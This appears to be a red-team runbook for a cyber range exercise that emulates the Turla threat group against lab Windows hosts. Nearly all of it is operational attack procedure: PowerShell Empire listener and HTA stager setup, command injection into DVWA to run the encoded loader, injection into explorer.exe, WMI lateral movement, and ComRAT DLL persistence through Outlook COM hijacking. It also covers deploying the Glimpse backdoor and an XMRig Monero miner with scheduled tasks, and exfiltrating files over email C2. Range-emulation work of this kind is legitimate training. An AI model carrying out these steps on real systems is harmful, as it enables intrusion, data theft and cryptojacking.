Comrade Turla Execution Actions
Targets List
Pre Vul Window:
Empire  VID[0,6,8,9]  GRAF[1,4,5,7]  CORP[2,3,6,9]  ADM[2,6,10]
Glimpse / CPU Miner  CORP[0-9]  ADM[0-9]
ComRAT  VID[8]  GRAF[5]
Exfil VID[8] attachmentsIG_Authorities_Paper_-_Final_6-11-14.pdf
Day 1:
Exfil GRAF[5] attachmentsimmctry.pdf
Exfil VID[8] attachmentsGlobalPOVContractImplementation.pdf
Day 2: 
Empire  VID[9]
ComRAT  VID[9]
Exfil  VID[9] attachments1040.pdf
Empire  ADM[10, 11]
Glimpse / CPU Miner ADM[10, 11]
Empire  ADM[6] ComRAT ADM[6]
Day 3:
Exfil ADM[6] attachments34-75113.pdf 


Accessing the South Range From STEP/TEXNET: 
Https://texnet2.net - CAC Auth 
Launch STEP from the dashboard � User/Pass Auth 
Go to �My Exercises� 
Click Exercise �VDI�, Team �CCA ROC Drill� -> Connect 
Exercise Player -> HTML5 
New Window Opens -> Map -> <Your Virtual WorkStation Name> 
Ctrl-Alt-Enter to go Fullscreen 
Login to the VDI workstation - �password�
Open a Browser and Navigate to the VMware vSphere Web Console @ 100.1.112.9  (VM Credentials page) 
vSphere CCA Datacenter Overview: 

CCA-2
Duplicate of above 
 
You are now on the STEP VDI WorkStation, with VMWare vSphere Client open.
ie. On your personal computer  In a browser  Opened a VDI through STEP  It launched a new Browser Tab/Window  Logged into a remote workstation  Opened a Browser  Logged into vSphere Client   About to open vSphere guest remote terminals. 
Ensure Lariat is running. (via requesting from ROC team)
 Look at the desktop of the WIN10 workstations.  Is a user logged in and doing stuff(using Outlook, Word, PowerPoint, Excel, and web browsing)? 
From the main C2 server, Kali-Shredder-Testing: 
Pre-Event:
Reset the C2  - Empire 
1. Login to Kali-Shredder-Testing as root (creds: see table in VM Credentials page)
a.  Exit PSEmpire if it is running, with the 'exit' command.
2. Change directory to ~/Scripts/Empire
3. Run the PSEmpire with reset option, --reset-empire. 
4. Press Enter for �random generation� when prompted.
5. Run the PSEmpire 

Create the listener

Enter the following commands to create a new listener
1. > uselistener http 
2. > set Name TurlaHTTP 
3. > set Port 80 
4. > set BindIP 204.18.115.213 
5. > set Host http://crimeariver.ru 
6. (Optional)> set WorkingHours 07:00 16:00  (synch working hours with Lariat running hours)
7. > execute  

Turla Threat Emulation 
Initial Access: Inject PS script/loader to load PS Empire stage 1 malware  
1.  Generate C2 Initial Access Payload � in Empire execute the following commands
a. > main   
b. > usestager windows/hta   
c. > set Listener TurlaHTTP 
d. > execute  

e. Copy PS portion of stager payload. ex. 'powershell -noP �w 1 �enc SQNAkdm2m... '

3. Access DVWA (Damn Vulnerable Web Application) hosted on tku.ua
a. Ensure the Windws user �VDrago� is logged into tku-12xampp-001
b. On Kali-Shredder, open DVWA in Browser (see table for URL) 
c. Login admin/password 

4. Change DVWA Security Level

a. Open the "DVWA Security" page and change the Security settings to 'Medium' and "Submit' the changes. 

5. Exploit DVWA - PHP shell_exec() exploit:  
1. Navigate to the 'Command Injection' page on DVWA.
2. Validate the vulnerability in DVWA. In the "Enter and IP address" form, enter "8.8.8.8 & whoami ".
3. 'Submit' the page. After the ping results output, the user that DVWA is running as should be displayed.


4. Now use the PowerShell Stager as the payload. After "8.8.8.8 & ", paste the Windows HTA Powershell Loader code that you copied from PSEmpire. 
5. Submit the page. The webpage will hang because the PowerShell Loader does not return (ie. The process executed from PHP shell_exec() does not return). 

6. Minimize (DO NOT CLOSE) the browser, switch to the PSE prompt, and wait for agent callback.
7. In Empire, you will see the Stager check-in

Discovery: process enumeration 
In PSEmpire, run the following commands to discover a process to hijack
1. > agents  
2. > autorun clear
3. > autorun resource/enum.rc powershell 
This will be run when the next agent checks in
4. > autorun show
5. > interact <XAMPP tku\SYSTEM ID goes here> 
This would be the only Empire agent available currently
6. > sysinfo
Exhibit that the agent is running as tku\SYSTEM, a 'service' account that has no user profile/login.
7. > ps explorer 
Run a Process Listing on the agents host to find the explorer.exe (Windows GUI Environment)

Privilege Escalation: non-System process (ie. explorer.exe) 
Explorer.exe is running under a logged-in user profile. This is a good process to hijack if we want to interact with user e-mail.
1.  > psinject TurlaHTTP <PID of explorer.exe> 
   A PSEmpire agent is injected into the running process (explorer.exe) and a new agent will call-back and get tasked with the autorun tasks. 2.  > back
Back to agents menu
3.  > interact <tku\VDrago explorer agent> 
The output from autorun tasks executed by the new agent will scroll down the screen.

Discovery: domain enumeration 
From the new agent, we perform network enumeration by running the following commands in Empire
1. > scriptimport scripts/GetLDAPComputers.ps1  
Loads the script into memory of agent process
2. > scriptcmd GetLDAPComputers  
Query LDAP for �computer� objects in Domain OU

Lateral Movement: Run only on the Empire targets computers.
Ensure Lariat is running. 
To perform lateral movement with PowerShell Empire, run the following commands from Empire
1. > interact <tku\VDrago explorer agent>
You may already be interacting with this agent
2. > usemodule lateral_movement/invoke_wmi
3. > info
4. > set Listener TurlaHTTP  

5. Loop: Perform these two commands for each Empire target in Targets List section 
a. > set ComputerName <target computer name> 
b. > run

Wait for the agent to call-back and execute its autorun tasks. 

6. (Optional) Adjust agent call-back interval � repeat for every active PSE agent 
a. > agents   
b. > interact <agent id>  
c. > sleep <random number from 250-350>  
d. > back  
Discovery: host enumeration
Automated during agent check-in with �autorun enum.rc� script in 'Discovery: Process enumeration' Step 3. 
Process Injection: to user process:
For each ComRAT target in the Targets List section perform the following steps from PSEmpire 
1. > agents  
2. > autorun clear   
3. > interact <target id>  

4. > ps explorer  (take note of the local user name) 
5. > psinject TurlaHTTP <explorer pid>
  
6. > agents 
7. > rename <new agent id> COMRAT1
'New agent ID' will be the one that just got created from the process injection.
Each host infected with ComRAT will get renamed consecutively. eg. COMRAT2, COMRAT3
8. > interact <COMRATX> 
Replace COMRATX with whichever ComRAT injected host name. eg. COMRAT1

Persistence: Upload and Execute the stage 2 malware, ComRAT DLL 
For each ComRAT target in the Targets List section perform the following steps from PSEmpire 
1. > interact <COMRAT1X> ex. interact COMRAT1
2. > resource resource/comrat.rc  
This resource drops and runs the Turla ComRAT malware. Wait for the resource output data.
3. > ps outlook  
Outlook needs to restart to load in the newly hijacked COM object (DLL)
4. > kill <outlook pid>

 
Start the ComRat C2 :  
Logs, downloads, etc will be saved in the cca_logs directory
1. # cd ~/Scripts/Comrade_Turla/comrade-turla-server/cca_logs  
2. (Optional) Delete the old logs  
#  ./clean_comrat_artifacts.sh
3. Start the Server 
# ./run_comrat.sh <target victim email>
4. At least 1 message with a status report should come 

5. Enter Ctrl+C to kill the ComRAT C2 server.
If no message is received from the C2 
Ensure Lariat is running.  
Ensure Outlook relaunched on victim host and is sending and receiving. 
Ensure SMTP Auth works. See below section �Testing VMail/GMail� 
Lateral Movement: Deploy Glimpse stage 2 malware
1. > agents  
2. > autorun clear  
3. In another Terminal, edit the variables�WorkStart�, �WorkEnd� and �SleepMin� in ~/Scripts/Empire/glimpse/runner_.vbs if needed. Default is 8:00-17:00 with 5 min sleep. 

4. > autorun resource/glimpse.rc powershell  
5. > interact <xampp VDrago agent id>  
6. > usemodule lateral_movement/invoke_wmi  
7. > set listener TurlaHTTP
  
8. Loop: Run on each Glimpse target in the Targets List section  
a. > set ComputerName <target>  
b. > run  
c. Wait for Empire agent call-back to check in and run autorun tasks.
 
d. (Optional) In the Glimpse GUI, add the Hostname in the comment field. 
Glimpse and XMRig Persistence: resource file creates schedule tasks (schtasks) �onStart� 
Mining Pool:
Note: See "Glimpse_XMRig - Setup - 14Apr2021.pdf" attachment on Red Team page for Setup instructions
1. Check that the mining pool on monero_bc_pool is handing out XMR mining tasks Ex. [pool] (Thread 4) Accepted trusted share at difficulty ... 
2. Kill and restart the MinningPoolStart.sh script if no messages like above appear after 5 min. 
Exfil: C2 comms via email 
Ensure Lariat is running on the hosts infected with ComRAT
For each ComRAT Exfil target email, perform the following
1. Perform steps 1-4 in the section Start the ComRAT C2
2. > ps "gci -exclude collab*" 
Search for files (excludes Lariat generated files)

3. Wait for response. Manually send email from the target's Outlook if necessary or check Lariat. 

4. Choose the file to exfiltrate according to the File Exfil List below
5. > getfile <filename>
 
6. Wait for file delivery

7. Ctrl+C to kill the C2
 File Exfil List

Additional Notes 
Kali-Shredder has Web server on port 81. /root/scripts/Empire/glimpse/disk_clean.exe is placed on a web server because of the 1MB upload limitations of Empire. This file is the miner that calls-back to Monero.
Clear user Documents in S:\Working\<USER>\Documents\collab* (documents Lariat creates) THIS SHOULD BE RANS RESPONSIBILITY. Clear stale OST in C:\users\<user>\AppData\Local\Microsoft\Outlook\ THIS SHOULD BE RANS RESPONSIBILITY.
Change Outlook Cache to �ALL� in Settings->Change
Check Glimpse C2 every 4-6 hours. If the check in time is not current, close the node.js app. It will auto-launch a new one. Activity should reestablish.
 
Testing Vmail/Gmail 

. 
Additional Notes 
 Test scripts may have typos (baubaresources) <--- Correct spelling
 On the exchange server, within "Mailflow"  "Accepted Domains" -add "gmail.com" domain
Make sure IMAP service is running
Make sure run_COMRAT.sh has mail server IP in script
 
